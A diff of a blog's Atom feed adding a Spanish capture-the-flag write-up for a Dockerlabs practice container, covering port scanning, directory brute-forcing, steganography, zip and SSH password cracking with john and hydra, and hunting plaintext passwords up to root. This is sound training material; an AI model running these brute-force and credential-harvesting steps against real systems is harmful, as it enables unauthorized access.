@@ -1,4 +1,368 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-21T18:28:28+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Ensala de papas</title><link href="/posts/Ensala/" rel="alternate" type="text/html" title="Ensala de papas" /><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>/posts/Ensala</id><content type="html" xml:base="/posts/Ensala/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-22T13:28:22+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">HereBash</title><link href="/posts/hereBash/" rel="alternate" type="text/html" title="HereBash" /><published>2024-06-22T00:00:00+00:00</published><updated>2024-06-22T00:00:00+00:00</updated><id>/posts/hereBash</id><content type="html" xml:base="/posts/hereBash/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 172.17.0.2
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Como vemos sólo tiene abiertos los puertos <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">80</code>. Realizamos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> para ver más detalles de esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 172.17.0.2
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+
+</code></pre></div></div>
+
+<p>Lo único relevante es que usa una versión reciente de <code class="language-plaintext highlighter-rouge">Apache</code> y que nos muestra una web por defecto.</p>
+
+<p>Comprobamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 <span class="nt">-v</span> http://172.17.0.2
+WhatWeb report <span class="k">for </span>http://172.17.0.2
+Status    : 200 OK
+Title     : Apache2 Ubuntu Default Page: It works
+IP        : 172.17.0.2
+Country   : RESERVED, ZZ
+
+Summary   : Apache[2.4.58], HTTPServer[Ubuntu Linux][Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)]</span>
+
+Detected Plugins:
+<span class="o">[</span> Apache <span class="o">]</span>
+        The Apache HTTP Server Project is an effort to develop and 
+        maintain an open-source HTTP server <span class="k">for </span>modern operating 
+        systems including UNIX and Windows NT. The goal of this 
+        project is to provide a secure, efficient and extensible 
+        server that provides HTTP services <span class="k">in </span><span class="nb">sync </span>with the current 
+        HTTP standards. 
+
+        Version      : 2.4.58 <span class="o">(</span>from HTTP Server Header<span class="o">)</span>
+        Google Dorks: <span class="o">(</span>3<span class="o">)</span>
+        Website     : http://httpd.apache.org/
+
+<span class="o">[</span> HTTPServer <span class="o">]</span>
+        HTTP server header string. This plugin also attempts to 
+        identify the operating system from the server header. 
+
+        OS           : Ubuntu Linux
+        String       : Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span> <span class="o">(</span>from server string<span class="o">)</span>
+
+HTTP Headers:
+        HTTP/1.1 200 OK
+        Date: Fri, 21 Jun 2024 22:24:25 GMT
+        Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+        Last-Modified: Sun, 16 Jun 2024 22:12:40 GMT
+        ETag: <span class="s2">"29ed-61b09259d8600-gzip"</span>
+        Accept-Ranges: bytes
+        Vary: Accept-Encoding
+        Content-Encoding: <span class="nb">gzip
+        </span>Content-Length: 3155
+        Connection: close
+        Content-Type: text/html
+</code></pre></div></div>
+
+<p>Vamos a hacer una búsqueda de directorios y ficheros con <code class="language-plaintext highlighter-rouge">feroxbuster</code>. Le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda, <code class="language-plaintext highlighter-rouge">-x</code> para indicarle qué extensión buscar en los ficheros y <code class="language-plaintext highlighter-rouge">-r</code> para seguir los redirecciones:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php,html,txt <span class="nt">-r</span>
+
+200      GET      939l     2384w    25537c http://172.17.0.2/spongebob/spongebob.html
+200      GET      838l     2290w    19747c http://172.17.0.2/spongebob/style.css
+200      GET      470l     2274w   217762c http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
+200      GET      365l      968w    10733c http://172.17.0.2/index.html
+200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
+200      GET      365l      968w    10733c http://172.17.0.2/405      GET        1l        3w       20c http://172.17.0.2/scripts/put.php
+200      GET       17l       71w     1130c http://172.17.0.2/scripts/
+200      GET       18l       80w     1341c http://172.17.0.2/spongebob/
+200      GET       15l       49w      739c http://172.17.0.2/revolt/
+</code></pre></div></div>
+
+<p>Me llama la atención el fichero <code class="language-plaintext highlighter-rouge">/scripts/put.php</code>. Hacemos un <code class="language-plaintext highlighter-rouge">curl</code> al fichero y nos dice que el metodo no está permitido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/scripts/put.php
+Método no permitido
+</code></pre></div></div>
+
+<p>Probamos el metodo <code class="language-plaintext highlighter-rouge">PUT</code> y siempre nos devuelve la misma cadena <em>spongebob</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> PUT http://172.17.0.2/scripts/put.php <span class="nt">-v</span>
+<span class="k">*</span>   Trying 172.17.0.2:80...
+<span class="k">*</span> Connected to 172.17.0.2 <span class="o">(</span>172.17.0.2<span class="o">)</span> port 80
+<span class="o">&gt;</span> PUT /scripts/put.php HTTP/1.1
+<span class="o">&gt;</span> Host: 172.17.0.2
+<span class="o">&gt;</span> User-Agent: curl/8.8.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 21 Jun 2024 22:48:04 GMT
+&lt; Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Content-Length: 10
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+&lt; 
+spongebob
+<span class="k">*</span> Connection <span class="c">#0 to host 172.17.0.2 left intact</span>
+</code></pre></div></div>
+
+<p>Descartamos esa via. Ahora nos descargamos la imagen que hay en <code class="language-plaintext highlighter-rouge">/spongebob/upload/</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
+</code></pre></div></div>
+
+<p>Buscamos si hay algún fichero oculto en esa imagen (esteganografía) con <code class="language-plaintext highlighter-rouge">stegseek</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>stegseek ohnorecallwin.jpg 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="o">[</span>i] Found passphrase: <span class="s2">"spongebob"</span>
+<span class="o">[</span>i] Original filename: <span class="s2">"seguro.zip"</span><span class="nb">.</span>
+<span class="o">[</span>i] Extracting to <span class="s2">"ohnorecallwin.jpg.out"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Comprobamos si es un fichero zip:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file ohnorecallwin.jpg.out 
+ohnorecallwin.jpg.out: Zip archive data, at least v1.0 to extract, compression <span class="nv">method</span><span class="o">=</span>store
+</code></pre></div></div>
+
+<p>Y lo remombramos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>ohnorecallwin.jpg.out seguro.zip
+</code></pre></div></div>
+
+<p>Intentamos descomprimirlo y nos pide una clave. Vamos a intentar averiguarla con <code class="language-plaintext highlighter-rouge">john</code>. Primero guardamos el hash del fichero zip con <code class="language-plaintext highlighter-rouge">zip2john</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john seguro.zip <span class="o">&gt;</span> zipHash
+ver 1.0 efh 5455 efh 7875 seguro.zip/secreto.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>3DF4DA21 <span class="nv">ts</span><span class="o">=</span>8387 <span class="nv">cs</span><span class="o">=</span>8387 <span class="nb">type</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Después intentamos crackear la password usando el diccionario <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zipHash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+chocolate        <span class="o">(</span>seguro.zip/secreto.txt<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2024-06-22 12:31<span class="o">)</span> 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>Descomprimimos con la clavé obtenida:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x secreto.zip 
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:2 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 211 bytes <span class="o">(</span>1 KiB<span class="o">)</span>
+
+Extracting archive: secreto.zip
+<span class="nt">--</span>
+Path <span class="o">=</span> secreto.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 211
+
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+Everything is Ok
+
+Size:       11
+Compressed: 211
+
+</code></pre></div></div>
+
+<p>Y al abrir el fichero vemos una palabra</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>secreto.txt 
+aprendemos
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>La palabra puede ser un usuario o una contraseña. Primero hacemos un intento de averiguar una contraseña para el usuario <em>aprendemos</em>. Para ello usamos <code class="language-plaintext highlighter-rouge">hydra</code> con <code class="language-plaintext highlighter-rouge">-l</code> indicamos el usuario, <code class="language-plaintext highlighter-rouge">-P</code> indicamos el diccionario de passwords <code class="language-plaintext highlighter-rouge">-V</code> para ver el detalle, <code class="language-plaintext highlighter-rouge">-I</code> para que no tenga en cuenta sesiones anteriores y <code class="language-plaintext highlighter-rouge">-f</code> para parar con la primera coincidencia. Tambien le indicamos el protocolo al que queremos realizar la fuerza bruta <code class="language-plaintext highlighter-rouge">ssh://172.17.0.2</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> aprendemos <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-f</span>
+
+</code></pre></div></div>
+
+<p>No obtenemos ningún resultado. Ahora vamos a probar a buscar un nombre de usuario para contraseña <em>aprendemos.</em> Con <code class="language-plaintext highlighter-rouge">-L</code> indicamos el diccionario de nombres de usuario y con <code class="language-plaintext highlighter-rouge">-p</code> la password. El resto es igual que el paso anterior.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt <span class="nt">-p</span> aprendemos <span class="nt">-t</span> 16 <span class="nt">-V</span> <span class="nt">-f</span> <span class="nt">-I</span> ssh://172.17.0.2
+6248 of 624377 <span class="o">[</span>child 9] <span class="o">(</span>0/7<span class="o">)</span>
+<span class="o">[</span>22][ssh] host: 172.17.0.2   login: rosa   password: aprendemos
+<span class="o">[</span>STATUS] attack finished <span class="k">for </span>172.17.0.2 <span class="o">(</span>valid pair found<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Obtenemos las credenciales <code class="language-plaintext highlighter-rouge">rosa:aprendemos</code> para poder acceder por ssh a nuestra victima. Nos conectamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh rosa@172.17.0.2
+rosa@4c6b113dd021:~<span class="nv">$ </span><span class="nb">hostname
+</span>4c6b113dd021
+</code></pre></div></div>
+
+<p>Buscamos que usuarios hay en el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span><span class="nb">grep</span> <span class="s2">"bash"</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
+pedro:x:1002:1002:,,,:/home/pedro:/bin/bash
+juan:x:1003:1003:,,,:/home/juan:/bin/bash
+</code></pre></div></div>
+
+<p>Lo primero que voy a hacer es buscar ficheros de cada usuario en el sistema. Usamos <code class="language-plaintext highlighter-rouge">find</code> para buscar en el directorio <code class="language-plaintext highlighter-rouge">/</code> de forma recursiva los ficheros <code class="language-plaintext highlighter-rouge">-type f</code> del usuario pedro <code class="language-plaintext highlighter-rouge">-user pedro</code> y redireccionamos a <code class="language-plaintext highlighter-rouge">/dev/null</code> los errores <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span>find / <span class="nt">-user</span> pedro <span class="nt">-type</span> f 2&gt;/dev/null 
+/var/mail/.pass_juan
+</code></pre></div></div>
+
+<p>Encontramos un fichero, pero…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/mail/.pass_juan 
+<span class="nt">-rw-rw----</span> 1 pedro pedro 17 Jun 18 03:41 /var/mail/.pass_juan
+</code></pre></div></div>
+
+<p>No tenemos permisos de lectura con el user actual.</p>
+
+<p>En el home del user actual, rosa, vemos que hay una carpeta llamada <code class="language-plaintext highlighter-rouge">-</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+drwxrwxr-x 69 rosa rosa 4096 Jun 17 08:25 -
+</code></pre></div></div>
+
+<p>Para entrar al directorio <code class="language-plaintext highlighter-rouge">-</code> hacemos <code class="language-plaintext highlighter-rouge">cd ./-</code> . Una vez dentro vemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">ls 
+</span>buscaelpass1   buscaelpass25  buscaelpass40  buscaelpass56
+buscaelpass10  buscaelpass26  buscaelpass41  buscaelpass57
+buscaelpass11  buscaelpass27  buscaelpass42  buscaelpass58
+buscaelpass12  buscaelpass28  buscaelpass43  buscaelpass59
+buscaelpass13  buscaelpass29  buscaelpass44  buscaelpass6
+buscaelpass14  buscaelpass3   buscaelpass45  buscaelpass60
+buscaelpass15  buscaelpass30  buscaelpass46  buscaelpass61
+buscaelpass16  buscaelpass31  buscaelpass47  buscaelpass62
+buscaelpass17  buscaelpass32  buscaelpass48  buscaelpass63
+buscaelpass18  buscaelpass33  buscaelpass49  buscaelpass64
+buscaelpass19  buscaelpass34  buscaelpass5   buscaelpass65
+buscaelpass2   buscaelpass35  buscaelpass50  buscaelpass66
+buscaelpass20  buscaelpass36  buscaelpass51  buscaelpass67
+buscaelpass21  buscaelpass37  buscaelpass52  buscaelpass7
+buscaelpass22  buscaelpass38  buscaelpass53  buscaelpass8
+buscaelpass23  buscaelpass39  buscaelpass54  buscaelpass9
+buscaelpass24  buscaelpass4   buscaelpass55  creararch.sh
+</code></pre></div></div>
+
+<p>Bastantes carpetas y un fichero en bash. Lo abrimos y vemos que hace:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">cat </span>creararch.sh 
+<span class="c">#!/bin/bash</span>
+
+<span class="c"># Buscamos directorios que empiezan con "busca"</span>
+<span class="k">for </span>directorio <span class="k">in </span>busca<span class="k">*</span><span class="p">;</span> <span class="k">do</span>
+        <span class="c"># Comprobamos si el directorio existe</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                <span class="c"># Crearmos 50 archivos y les metemos el contenido xx</span>
+                <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..50<span class="o">}</span><span class="p">;</span> <span class="k">do
+                        </span><span class="nb">touch</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">/archivo</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"xxxxxx:xxxxxx"</span> <span class="o">&gt;</span><span class="nv">$directorio</span>/archivo<span class="nv">$i</span>
+                <span class="k">done
+                </span><span class="nb">echo</span> <span class="s2">"Se crearon 50 archivos en </span><span class="nv">$directorio</span><span class="s2">"</span>
+        <span class="k">else
+                </span><span class="nb">echo</span> <span class="s2">"El directorio </span><span class="nv">$directorio</span><span class="s2"> no existe"</span>
+        <span class="k">fi
+done</span>
+</code></pre></div></div>
+
+<p>Recorre todos los directorios que comienzan con <em>busca</em> y crea 50 archivos con un texto dentro <code class="language-plaintext highlighter-rouge">touch "$directorio/archivo$i" &amp;&amp; echo "xxxxxx:xxxxxx" &gt;$directorio/archivo$i</code> . Entonces buscaremos el fichero que no contenga esa cadena. Usamos <code class="language-plaintext highlighter-rouge">grep</code> con las opciones<code class="language-plaintext highlighter-rouge">-rv</code> que sirve para buscar recursivamente por los subdirectorios <code class="language-plaintext highlighter-rouge">r</code> y excluyendo <code class="language-plaintext highlighter-rouge">v</code> la cadena <code class="language-plaintext highlighter-rouge">xxxxxx:xxxxxx</code> empezando en el directorio actual.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-rv</span> <span class="s2">"xxxxxx:xxxxxx"</span> <span class="nb">.</span>
+./buscaelpass33/archivo21:pedro:ell0c0
+./creararch.sh:#!/bin/bash
+./creararch.sh:
+./creararch.sh:# Buscamos directorios que empiezan con <span class="s2">"busca"</span>
+./creararch.sh:for directorio <span class="k">in </span>busca<span class="k">*</span><span class="p">;</span> <span class="k">do</span>
+./creararch.sh: <span class="c"># Comprobamos si el directorio existe</span>
+./creararch.sh: <span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$directorio</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+./creararch.sh:         <span class="c"># Crearmos 50 archivos y les metemos el contenido xx</span>
+./creararch.sh:         <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..50<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+./creararch.sh:         <span class="k">done</span>
+./creararch.sh:         <span class="nb">echo</span> <span class="s2">"Se crearon 50 archivos en </span><span class="nv">$directorio</span><span class="s2">"</span>
+./creararch.sh: <span class="k">else</span>
+./creararch.sh:         <span class="nb">echo</span> <span class="s2">"El directorio </span><span class="nv">$directorio</span><span class="s2"> no existe"</span>
+./creararch.sh: <span class="k">fi</span>
+./creararch.sh:done
+</code></pre></div></div>
+
+<p>Encontramos la password de pedro. Nos logueamos como pedro:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosa@4c6b113dd021:~/-<span class="nv">$ </span>su pedro
+Password: 
+pedro@4c6b113dd021:/home/rosa/-<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y como antes habíamos encontrado un fichero que pertenecía a pedro lo abrimos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> /var/mail/.pass_juan 
+ZWxwcmVzaW9uZXMK
+</code></pre></div></div>
+
+<p>Nos logueamos como juan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@4c6b113dd021:~<span class="nv">$ </span>su juan
+Password: 
+juan@4c6b113dd021:/home/pedro<span class="nv">$ </span><span class="nb">cd</span> ~
+juan@4c6b113dd021:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Hacemos un listado a su home:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 32
+drwxr-x--- 3 juan juan 4096 Jun 17 09:02 <span class="nb">.</span>
+drwxr-xr-x 1 root root 4096 Jun 17 08:22 ..
+<span class="nt">-rw-r--r--</span> 1 juan juan  220 Jun 17 08:22 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 juan juan 3791 Jun 17 08:42 .bashrc
+drwxrwxr-x 3 juan juan 4096 Jun 17 08:41 .local
+<span class="nt">-rw-rw-r--</span> 1 juan juan  112 Jun 17 08:45 .ordenes_nuevas
+<span class="nt">-rw-r--r--</span> 1 juan juan  807 Jun 17 08:22 .profile
+</code></pre></div></div>
+
+<p>Vemos el fichero<code class="language-plaintext highlighter-rouge">.ordenes_nuevas</code>, lo abrimos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> .ordenes_nuevas 
+Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Buscanos dentro del fichero<code class="language-plaintext highlighter-rouge">.bashrc</code> y encontramos la password del patrón:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> .bashrc
+<span class="nb">alias </span><span class="nv">pass</span><span class="o">=</span><span class="s1">'eljefe'</span>
+</code></pre></div></div>
+
+<p>Nos logueamos como root y finalizamos la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span>su
+Password: 
+root@4c6b113dd021:/home/juan# <span class="nb">cd</span> ~
+root@4c6b113dd021:~#
+</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Ensala de papas</title><link href="/posts/Ensala/" rel="alternate" type="text/html" title="Ensala de papas" /><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>/posts/Ensala</id><content type="html" xml:base="/posts/Ensala/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
 <h1 id="enumeración">Enumeración</h1>
 
